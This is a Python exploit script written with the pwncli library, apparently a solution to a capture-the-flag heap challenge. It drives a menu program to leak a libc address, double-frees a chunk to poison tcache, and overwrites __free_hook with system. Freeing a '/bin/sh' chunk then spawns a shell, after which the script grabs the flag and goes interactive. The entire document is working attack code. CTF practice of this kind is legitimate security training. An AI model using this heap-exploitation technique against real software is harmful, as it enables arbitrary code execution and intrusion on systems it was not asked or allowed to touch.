#!/usr/bin/python3
from pwncli import *


cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data="/bin/sh\x00"):
    p.sendlineafter("> \n", "1")
    p.sendlineafter("input the size \n", str(size))
    p.sendafter("now you can input something...\n", data)


def dele(idx):
    p.sendlineafter("> \n", "2")
    p.sendlineafter("input the index\n", str(idx))


def show(idx):
    p.sendlineafter("> \n", "3")
    p.sendlineafter("input the index\n", str(idx))
    m = p.recvline(0)
    info(f"Get msg: {m}")
    return m

p.sendlineafter("input name\n", "NEUQRO")

add(0x90)

for i in range(20):
    add(0x10)

for i in range(8):
    dele(0)

m = show(0)
libc_base = u64_ex(m) - 0x3ebca0

dele(1)
dele(1)

add(0x10, p64(libc_base+libc.sym['__free_hook']))
add(0x10)
add(0x10, p64(libc_base+libc.sym['system']))
 
dele(2)

get_flag_when_get_shell(p)

p.interactive()